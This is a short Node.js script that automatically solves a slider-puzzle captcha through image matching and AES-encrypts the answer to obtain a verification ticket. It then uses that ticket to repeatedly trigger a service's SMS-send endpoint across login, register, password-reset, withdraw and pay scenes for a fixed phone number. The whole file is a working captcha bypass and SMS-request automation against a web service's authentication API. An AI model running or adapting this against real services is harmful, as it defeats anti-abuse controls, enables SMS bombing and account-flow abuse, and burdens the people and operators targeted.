import {B,H,j,aes,solveV2} from './lib_captcha.mjs';
import crypto from 'node:crypto';
async function cv(){
  const uid=crypto.randomUUID();
  const cap=await j(fetch(B+'/api/auth/captcha/behavior?'+new URLSearchParams({captchaType:'blockPuzzle',clientUid:uid,ts:String(Date.now())}),{headers:H}));
  const d=cap?.data;
  const r=solveV2(Buffer.from(d.originalImageBase64,'base64'),Buffer.from(d.jigsawImageBase64,'base64'));
  const pj=aes(JSON.stringify({x:r.nccTop[0].dx,y:5}),d.secretKey);
  const chk=await j(fetch(B+'/api/auth/captcha/behavior',{method:'POST',headers:H,body:JSON.stringify({captchaType:'blockPuzzle',token:d.token,pointJson:pj,clientUid:uid,ts:Date.now()})}));
  if(chk?.data?.repCode!=='0000') return null;
  return aes(d.token+'---'+pj,d.secretKey);
}
const scenes=['login','register','reset','forgetpwd','bind','change','withdraw','pay'];
for(const sc of scenes){
  const v=await cv(); if(!v){console.log(sc,'ticket-fail');continue;}
  const tries=[];
  for(let i=0;i<5;i++){
    const r=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:'19900000001',scene:sc,captchaVerification:v})}));
    tries.push(r.code+':'+r.msg);
    if(r.code!=='400') break;
    await new Promise(z=>setTimeout(z,200));
  }
  console.log(sc.padEnd(12), tries.join(' | '));
}
